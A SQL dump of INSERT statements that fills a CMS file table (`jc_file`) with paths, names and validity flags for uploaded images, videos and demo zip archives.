INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/13142927kzr3.jpg','13142927kzr3.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/1316285322ks.jpg','1316285322ks.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/13162904gqxm.jpg','13162904gqxm.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/13162913da42.jpg','13162913da42.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/131629222u39.jpg','131629222u39.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/13162931ofsn.jpg','13162931ofsn.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/13162941ipg2.jpg','13162941ipg2.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/13163101ccd3.jpg','13163101ccd3.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/13163113pd3s.jpg','13163113pd3s.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/13163306pqvc.jpg','13163306pqvc.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/13165112t47d.jpg','13165112t47d.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/13165118lr7r.jpg','13165118lr7r.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/13165348xokj.jpg','13165348xokj.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/131656557m43.jpg','131656557m43.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/13165702cchp.jpg','13165702cchp.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/13170123ywvv.jpg','13170123ywvv.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/13170129mx9q.jpg','13170129mx9q.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/13170427k084.jpg','13170427k084.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/131706089h4w.jpg','131706089h4w.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/13170759d8ow.jpg','13170759d8ow.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/13170940lu1h.jpg','13170940lu1h.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/19110822fin2.jpg','19110822fin2.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/19112623820c.jpg','19112623820c.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/19112700bypf.jpg','19112700bypf.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/19114043tp85.jpg','19114043tp85.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/19114201tdir.jpg','19114201tdir.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/191201449moh.jpg','191201449moh.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/191203538tdp.jpg','191203538tdp.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/19131809acqm.jpg','19131809acqm.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/19131949r2ge.jpg','19131949r2ge.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/191342393mlg.jpg','191342393mlg.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/19134448qvza.jpg','19134448qvza.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/191351590e53.jpg','191351590e53.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/19135642zjak.jpg','19135642zjak.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/19135645ge7r.jpg','19135645ge7r.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/19135821ij0m.jpg','19135821ij0m.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/19140340fri2.jpg','19140340fri2.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/19140601kgid.jpg','19140601kgid.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/19140803w9fg.jpg','19140803w9fg.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/191408471iyj.jpg','191408471iyj.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/19141200ip5c.jpg','19141200ip5c.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/19141318apz1.jpg','19141318apz1.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/19141700opui.jpg','19141700opui.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/19141756u9sa.jpg','19141756u9sa.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/19142041eu8x.jpg','19142041eu8x.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/19142206y73m.jpg','19142206y73m.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/19142430589t.jpg','19142430589t.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/19142451945q.jpg','19142451945q.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/19142818yvty.jpg','19142818yvty.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/19142840ycm6.jpg','19142840ycm6.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201139137vu6.jpg','201139137vu6.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/20114003od1n.jpg','20114003od1n.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201140399nrc.jpg','201140399nrc.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201143116bd3.jpg','201143116bd3.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/20114348t1z8.jpg','20114348t1z8.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/20114520rqti.jpg','20114520rqti.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/20114607jim6.jpg','20114607jim6.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/20114824s9bf.jpg','20114824s9bf.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/20115532h8tv.jpg','20115532h8tv.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201159459afm.jpg','201159459afm.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/20120531bbei.jpg','20120531bbei.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/20120732ybv8.jpg','20120732ybv8.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201308','201308',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201308//mv.jpg','mv.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201309','201309',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201312/301119254w80.flv','/u/cms/www/201312/301119254w80.flv',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201505/08115215axo2.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201505/08115420e3qq.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201505/08115602zbpp.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201505/0814345226bf.png','屏幕截图(1).png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201505/081435107c1f.png','QQ图片20150417172121.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201505/08143510hn5q.jpg','mv1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201505/19101000895y.jpg','2.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201505/19102214sw7g.jpg','2.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201505/28153507v3si.jpg','2.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201505/28153820xz3s.jpg','2.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201505/28155213xbnf.jpg','2.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201505/28155257lfcw.jpg','2.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201505/28155304ool6.jpg','2.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201508/10104142j87z.jpg','2.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201508/101104049u6a.jpg','2.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201508/10110750eroe.jpg','2.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201508/101109584374.jpg','3.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201508/10112023agt7.jpg','3.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201508/10163704n0m7.jpg','2.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201508/10172037p56n.jpg','3.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201508/271405251vsw.jpg','2.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201508/27141715ku66.jpg','2.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201508/271419260xl6.jpg','2.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201510/08103133dosc.jpg','1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201510/08104832360a.jpg','1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201510/08105041f9xd.jpg','1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201510/081613140y6j.jpg','1.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201510/08161359pv1d.jpg','2.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201510/08161538j0sn.png','logo.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201510/08162637wfpl.png','logo.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201510/08172019lz4w.png','logo.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201510/27142936gt6k.jpg','131423399l1z.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201607/15144722d5ed.jpg','banner02.jpg',0,2);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201607/151530033koq.jpg','xZ.jpg',1,7);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201607/15154001xgx4.jpg','banner04.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201607/15154249ucra.jpg','banner05.jpg',1,2);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201607/15154302mvu4.jpg','MAIN201607051346000203081566005.jpg',1,2);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201607/15154338b6h9.jpg','MAIN201607051346000202770265284.jpg',1,2);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201607/19141129f6g4.jpg','qweq.jpg',1,13);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201607/19141205t5d9.jpg','MAIN201607190815465375224112529.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201607/19142033fu5h.jpg','zxc.jpg',1,14);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201608/30174757ffr0.jpg','255901999.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/13103353l0rl.png','small-prev-page-on.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/131035049a54.png','m-sj.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/13103723gjne.png','small-prev-page-on.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/13103724lwp5.png','small-next-page.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/13103724wi3l.png','small-next-page-on.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/1310372501bw.png','small-prev-page.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/13103813zfv9.png','member-nav.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/13103824db3u.png','m-sj.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/19152319tjq4.png','zsr.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/19152412hzzi.png','zsr.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/191535032l85.png','zhye.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/19153503qjwl.png','zsr.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/19153920h4eu.png','zhye.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/19154055s1o7.png','zhye.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/191544366efu.png','gmcs.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/19154641z4av.png','gmcs.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/191547450q92.png','gmcs.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/19154854sed0.png','gmcs.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/19155012rfja.png','gmcs.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/19155535g178.png','gmcs.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/191556168oxh.png','zhye.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/191557592avc.png','zsr.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/19155839xtw8.png','zhye.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/191559127g8a.png','gmcs.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/19155948ohk3.png','gmcs.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/191601382uqh.png','txsj.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/19160214xqcz.png','gmcs.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/19160256yti4.png','txcs.png',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/22165418ezkw.jpg','vs.jpg',1,28);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/23091850z61y.jpg','ttsf.jpg',1,32);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/23092240hxg8.jpg','adff.jpg',1,33);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/23093922giys.jpg','bc.jpg',1,36);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/230942139uh5.jpg','xcv.jpg',1,37);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/23095358y6s6.jpg','qw.jpg',1,39);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/23100710845n.jpg','sf.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/23150119m7z0.jpg','zsf.jpg',1,27);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/26101908i5ds.jpg','video02.jpg',1,53);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/26102008qcao.jpg','video04.jpg',1,55);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/26102115joze.jpg','video06.jpg',1,57);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/261022192w54.jpg','video08.jpg',1,59);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/26102904f2l8.jpg','video12.jpg',1,61);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/26103003hrib.jpg','video11.jpg',1,63);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/261635496465.zip','演示.zip',1,69);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/26164039i3uv.jpg','dl-QQ.jpg',1,69);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/261640457r2n.jpg','dl_top.jpg',1,69);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/27094715plsz.jpg','download02.jpg',0,71);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/270953566xxw.jpg','content-bdy.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/27095528bd43.jpg','download02.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/270958122ljv.jpg','content-bdy.jpg',1,71);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/27095816s3y8.jpg','dl-bdy.jpg',1,71);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/271002022fag.zip','演示.zip',1,71);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/27101510bh0o.jpg','download03.jpg',1,72);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/27101514u0i9.jpg','content-360sd.jpg',1,72);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/27101524dxj7.jpg','dl-360shadu.jpg',1,72);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/27102743993k.zip','演示.zip',1,72);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/27103024lgp2.jpg','download02.jpg',0,71);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/271031297jwc.jpg','download02.jpg',0,71);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/27103421zh99.jpg','download04.jpg',0,71);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201609/27103503tm30.jpg','download04.jpg',0,71);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/08153906dmjk.jpg','wenku_item05.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/081540214khn.jpg','wenku_item05.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/08154224b4zl.jpg','wenku_item05.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/08155845dhts.jpg','wenku_item05.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/08160110rjjx.jpg','wenku_item05.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/081602097gfq.jpg','wenku_item05.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/08162230t0wf.jpg','wenku_item05.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/08162651u5t0.jpg','wenku_item05.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10100842hqdk.jpg','topic_title03.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10100850mssf.jpg','topic03.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/10100951y2xy.jpg','topic_title02.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/1010095517rc.jpg','topic02.jpg',0,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/201610/101010021q7v.jpg','topic_title01.jpg',1,NULL);
